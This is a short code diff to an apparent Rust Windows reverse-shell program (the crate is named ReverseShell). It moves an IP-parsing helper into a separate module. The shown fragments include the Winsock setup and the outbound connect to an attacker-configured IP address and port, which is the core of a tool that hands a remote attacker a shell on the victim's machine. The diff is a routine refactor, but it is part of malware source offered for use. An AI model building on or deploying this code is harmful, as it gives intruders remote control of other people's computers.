@@ -6,6 +6,8 @@ use core::ffi::c_void;
 use core::panic::PanicInfo;
 use ReverseShell::settings::{IP_ADDRESS, PORT};
 
+mod helpers;
+
 #[link(name = "ws2_32")]
 unsafe extern "system" {
     fn WSAStartup(wVersionRequested: u16, lpWSAData: *mut c_void) -> i32;
@@ -53,7 +55,7 @@ pub extern "system" fn WinMain(
         let mut addr = SOCKADDR_IN {
             sin_family: 2, // AF_INET
             sin_port: (PORT.to_be()), //  (big-endian)
-            sin_addr: ip_str_to_u32(IP_ADDRESS), // little-endian WinSock
+            sin_addr: helpers::ip_str_to_u32(IP_ADDRESS), // little-endian WinSock
             sin_zero: [0; 8],
         };
         if connect(sock, &addr, core::mem::size_of::<SOCKADDR_IN>() as i32) != 0 {
@@ -86,25 +88,6 @@ pub extern "system" fn WinMain(
     0
 }
 
-/* Helpers  */
-fn ip_str_to_u32(ip: &str) -> u32 {
-    let mut octets = [0u8; 4];
-    let mut parts = ip.as_bytes().split(|&b| b == b'.');
 
-    for i in 0..4 {
-        if let Some(part) = parts.next() {
-            let mut num = 0u8;
-            for &b in part {
-                if b < b'0' || b > b'9' {
-                    return 0; // Ogiltig IP, returnera 0.0.0.0
-                }
-                num = num * 10 + (b - b'0');
-            }
-            octets[i] = num;
-        }
-    }
-
-    u32::from_ne_bytes(octets)
-}
 
 
